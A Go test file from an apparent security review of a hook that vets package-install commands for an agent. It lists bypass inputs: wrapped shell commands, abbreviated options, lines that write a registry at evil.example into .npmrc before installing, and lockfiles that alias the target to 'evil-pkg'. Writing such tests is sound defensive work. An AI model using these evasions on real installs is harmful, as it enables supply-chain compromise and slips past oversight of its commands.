//go:build unix

package main

// Independent re-review of a5d1def (REPO-POL-NPMRC round 2, ADR-0174 round 7), 2026-11-15: proof tests. A failing
// case is a finding. Bypasses: the line reader (ParseLine, HookExtra) holds nothing, so the exception path is taken,
// the install reads a source the hook did not judge, and an exception covers the hold. False holds: nothing moves the
// target, and the exception is lost.

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/alalanet/alalanet-agent/internal/installread"
)

// exceptionPath: the line reader finds a target and holds nothing of its own, so only registryMoved stands between
// the hold and an exception.
func exceptionPath(t *testing.T, command string) {
	t.Helper()
	targets, unread, _, subst := installread.ParseLine(command)
	if len(targets) == 0 || len(unread) > 0 || subst || len(installread.HookExtra(command, targets, unread, subst)) > 0 {
		t.Fatalf("%s: not on the exception path (targets %v, unread %v, subst %v)", command, targets, unread, subst)
	}
}

func TestR2ReviewLineBypasses(t *testing.T) {
	for _, c := range []struct{ name, command string }{
		// B1: the walk past wrappers is not ParseLine's (a wrapper's option with a value, env -S, --, pwsh, cmd)
		{"timeout's duration", "timeout 5 sh -c 'cd /srv && npm i @acme/cli'"},
		{"nice's value", "nice -n 5 sh -c 'cd /srv && npm i @acme/cli'"},
		{"sudo -u", "sudo -u me sh -c 'cd /srv && npm i @acme/cli'"},
		{"env -u", "env -u FOO sh -c 'cd /srv && npm i @acme/cli'"},
		{"env -S", "env -S 'npm --prefix=/srv i @acme/cli'"},
		{"sh -c --", "bash -c -- 'cd /srv && npm i @acme/cli'"},
		{"pwsh -Command", "pwsh -Command 'cd /srv; npm i @acme/cli'"},
		{"cmd /c", `cmd /c "cd /srv && npm i @acme/cli"`},
		{"an escaped cd", `c\d /srv && npm i @acme/cli`},
		{"cd by a variable", "C=cd; $C /srv && npm i @acme/cli"},
		// Commands splits the raw line; ParseLine first turns $(which bash) into bash (whichSubst)
		{"a shell by $(which)", "$(which bash) -c 'cd /srv && npm i @acme/cli'"},
		{"an option by a variable before the subcommand", "P=--prefix=/srv; npm $P i @acme/cli"},
		// B2: sudo -D after another option, attached values
		{"sudo -u then -D", "sudo -u me -D /srv npm i @acme/cli"},
		{"sudo -D attached", "sudo -D/srv npm i @acme/cli"},
		{"env -C attached", "env -C/srv npm i @acme/cli"},
		// B3: npm's and pip's abbreviated long options, pip's and uv's grouped short options (npm 10.8.2, pip 26.2.2
		// and uv 0.13.7 parse each of these as the full option: checked locally, no network)
		{"npm --prefi", "npm i @acme/cli --prefi /srv"},
		{"npm --offl", "npm i @acme/cli --offl"},
		{"npm --prefer-of", "npm i @acme/cli --prefer-of"},
		{"pip -Ur", "pip install -Ur req.txt acme-tools"},
		{"pip -qc", "pip install -qc c.txt acme-tools"},
		{"pip --cons", "pip install --cons c.txt acme-tools"},
		{"uv -qr", "uv pip install -qr req.txt acme-tools"},
		// B4: an inline variable that moves every user config or the project
		{"HOME", "HOME=/srv npm i @acme/cli"},
		{"XDG_CONFIG_HOME", "XDG_CONFIG_HOME=/srv pnpm add @acme/cli"},
		{"UV_PROJECT", "UV_PROJECT=/srv uv add acme-tools"},
		// B5: the line writes a config file before the install runs (read before the line runs)
		{"echo into .npmrc", "echo @acme:registry=https://evil.example/ > .npmrc && npm i @acme/cli"},
		{"cp over .npmrc", "cp /tmp/x/npmrc .npmrc && npm i @acme/cli"},
		{"git checkout of .npmrc", "git checkout other -- .npmrc && npm i @acme/cli"},
		// Yarn 2+ runs the command in the workspace's folder and reads its .yarnrc.yml (stricter reading)
		{"yarn workspace", "yarn workspace sub add @acme/cli"},
	} {
		// A line the shared reader now holds by itself never reaches the exception path, which is the stronger
		// outcome: READER-VAR-OPT-1 reads "npm $P i x" as unread (a hidden word before the subcommand), and no
		// exception covers an unread line. Such a case is still checked to be held, not silent.
		if targets, unread, _, subst := installread.ParseLine(c.command); len(targets) == 0 || len(unread) > 0 || subst ||
			len(installread.HookExtra(c.command, targets, unread, subst)) > 0 {
			if len(unread) == 0 && !subst && len(installread.HookExtra(c.command, targets, unread, subst)) == 0 {
				t.Errorf("%s (%s): neither on the exception path nor held by the reader (targets %v)", c.name, c.command, targets)
			}
		} else {
			exceptionPath(t, c.command)
		}
		_, _, cwd := npmWorkspace(t)
		if form, stderr := round7(t, cwd, c.command, nil); form == "silent" {
			t.Errorf("%s (%s): an exception covers it (stderr %q)", c.name, c.command, stderr)
		}
	}
}

func TestR2ReviewProjectBypasses(t *testing.T) {
	evilTar := "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz"
	for _, c := range []struct{ name, file, body, command string }{
		// B6: a lockfile entry of the target that is another package (an alias, or another package's tarball on the
		// public host): the host check alone passes it
		{"package-lock: another package's tarball", "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"dependencies":{"@acme/cli":"^1.0.0"}},"node_modules/@acme/cli":{"name":"evil-pkg","version":"1.0.0","resolved":"` + evilTar + `","integrity":"sha512-AAAA"}}}`, "npm i @acme/cli"},
		{"yarn.lock 1: another package's tarball", "yarn.lock", "# yarn lockfile v1\n\n\"@acme/cli@^1.0.0\":\n  version \"1.0.0\"\n  resolved \"" + evilTar + "#abc\"\n  integrity sha512-AAAA\n", "yarn add @acme/cli"},
		{"pnpm-lock 9: an alias", "pnpm-lock.yaml", "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      '@acme/cli':\n        specifier: npm:evil-pkg@^1\n        version: evil-pkg@1.0.0\npackages:\n  evil-pkg@1.0.0:\n    resolution: {integrity: sha512-AAAA}\nsnapshots:\n  evil-pkg@1.0.0: {}\n", "pnpm add @acme/cli"},
		{"pnpm-lock 6: a link at the top", "pnpm-lock.yaml", "lockfileVersion: '6.0'\ndependencies:\n  '@acme/cli':\n    specifier: link:../evil\n    version: link:../evil\n", "pnpm add @acme/cli"},
		{"bun.lock: an alias", "bun.lock", `{"lockfileVersion":1,"workspaces":{"":{"dependencies":{"@acme/cli":"npm:evil-pkg@1"}}},"packages":{"@acme/cli":["evil-pkg@1.0.0","",{},"sha512-AAAA"],}}`, "bun add @acme/cli"},
		// B7: a patch the package manager applies to the target's files
		{"pnpm patchedDependencies (package.json)", "package.json", `{"pnpm":{"patchedDependencies":{"@acme/cli@1.2.0":"patches/x.patch"}}}`, "pnpm add @acme/cli"},
		{"pnpm patchedDependencies (workspace)", "pnpm-workspace.yaml", "patchedDependencies:\n  '@acme/cli@1.2.0': patches/x.patch\n", "pnpm add @acme/cli"},
		{"bun patchedDependencies", "package.json", `{"patchedDependencies":{"@acme/cli@1.2.0":"patches/x.patch"}}`, "bun add @acme/cli"},
	} {
		exceptionPath(t, c.command)
		_, root, cwd := npmWorkspace(t)
		write(t, filepath.Join(root, c.file), c.body)
		if form, stderr := round7(t, cwd, c.command, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}

func TestR2ReviewFalseHolds(t *testing.T) {
	// F1: -c is pip's only in a pip command (the ADR's rule), not in a shell's whose script names pip
	t.Run("pip in sh -c", func(t *testing.T) {
		const command = "sh -c 'pip install acme-tools==2.0.1'"
		exceptionPath(t, command)
		_, _, cwd := npmWorkspace(t)
		if form, stderr := round7(t, cwd, command, nil); form != "silent" {
			t.Errorf("%s, want silent (stderr %q)", form, stderr)
		}
	})
	for _, c := range []struct{ name, file, body, link string }{
		// F2: Homebrew's caveats for zsh-autosuggestions and zsh-syntax-highlighting; "prefix" is not $PREFIX
		{"brew --prefix", ".zshrc", "source $(brew --prefix)/share/zsh-autosuggestions/zsh-autosuggestions.zsh\n", ""},
		{"a prefix word", ".zshrc", "zstyle ':completion:*' completer _complete _prefix\nbindkey '^[[A' history-beginning-search-backward # prefix\n", ""},
		// F3: dotfile managers (stow, chezmoi's symlink mode, home-manager) link the startup files
		{"a linked .zshrc", ".zshrc", "export PATH=$HOME/bin:$PATH\n", "dotfiles/zshrc"},
		{"a linked .bashrc", ".bashrc", "alias ll='ls -l'\n", "dotfiles/bashrc"},
	} {
		t.Run(c.name, func(t *testing.T) {
			_, _, cwd := npmWorkspace(t)
			home := t.TempDir()
			p := filepath.Join(home, c.file)
			if c.link != "" {
				target := filepath.Join(home, c.link)
				mkdir(t, filepath.Dir(target))
				write(t, target, c.body)
				if err := os.Symlink(target, p); err != nil {
					t.Fatal(err)
				}
			} else {
				write(t, p, c.body)
			}
			form, stderr := round7(t, cwd, "npm i @acme/cli", npmrcFiles(t, "", home, nil, nil))
			if form != "silent" {
				t.Errorf("%s, want silent (stderr %q)", form, strings.TrimSpace(stderr))
			}
		})
	}
}
